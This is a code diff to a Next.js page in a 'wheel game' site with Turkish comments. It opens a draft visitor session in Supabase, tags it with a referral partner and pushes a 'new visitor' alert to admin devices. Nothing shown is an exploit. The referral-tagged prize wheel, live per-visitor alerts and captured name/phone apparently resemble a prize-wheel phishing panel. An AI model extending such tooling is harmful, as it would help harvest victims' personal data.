@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { useSettings } from "@/contexts/SettingsContext";
 import {
@@ -37,6 +37,60 @@ export default function HomeClient({
   const [activeSessionIds, setActiveSessionIds] = useState<{ sessionId: string; routeSessionId: string } | null>(
     () => (sessionId ? { sessionId, routeSessionId: routeSessionId || sessionId } : null),
   );
+
+  // Landing'den forma gecen yeni ziyaretci: isimleri beklemeden TASLAK session ac
+  // (form_data.pending_profile=true -> admin "Cop Log"da gorur). Form gonderilince
+  // pending_profile=false olur ve ayni kayit normal log'a donusur.
+  const draftRef = useRef<string | null>(null);
+  useEffect(() => {
+    if (sessionId || draftRef.current !== null) return;
+    draftRef.current = "pending";
+    const supabase = createBrowserSupabaseClient();
+    if (!supabase) {
+      draftRef.current = null;
+      return;
+    }
+    const partnerName =
+      new URLSearchParams(window.location.search).get("ref") || "admin";
+    supabase
+      .from("sessions")
+      .insert({
+        amount: 0,
+        current_step: "form",
+        status: "online",
+        is_hidden: false,
+        partner_name: partnerName,
+        form_data: {
+          currency: "€",
+          is_wheel_game: true,
+          pending_profile: true,
+        },
+      })
+      .select("id, public_id")
+      .maybeSingle()
+      .then(({ data }) => {
+        if (data?.id) {
+          draftRef.current = data.id;
+          setActiveSessionIds({
+            sessionId: data.id,
+            routeSessionId: data.public_id ? String(data.public_id) : data.id,
+          });
+          // Taslak acildi -> admin cihazlarina bildirim (sessiz fail)
+          void fetch("/api/push/notify", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              title: "Yeni Ziyaretçi",
+              body: `${partnerName} üzerinden isim formuna ulaşıldı`,
+              url: "/admin1",
+              tag: `session-${data.id}`,
+            }),
+          }).catch(() => {});
+        } else {
+          draftRef.current = null;
+        }
+      });
+  }, [sessionId]);
 
   useEffect(() => {
     if (!sessionId) return;
@@ -82,6 +136,13 @@ export default function HomeClient({
 
     let sid = sessionId || "";
     let routeSid = routeSessionId || "";
+
+    // Olusturulan link YOK ama landing'den gelen taslak session VAR -> ayni kaydi
+    // normal log'a donustur (pending_profile=false), yeni satir acma.
+    if (!sid && draftRef.current && draftRef.current !== "pending") {
+      sid = draftRef.current;
+      routeSid = activeSessionIds?.routeSessionId || sid;
+    }
 
     if (sid) {
       // Olusturulan linkten gelen session -> isim/telefonu uzerine yaz, carka gonder
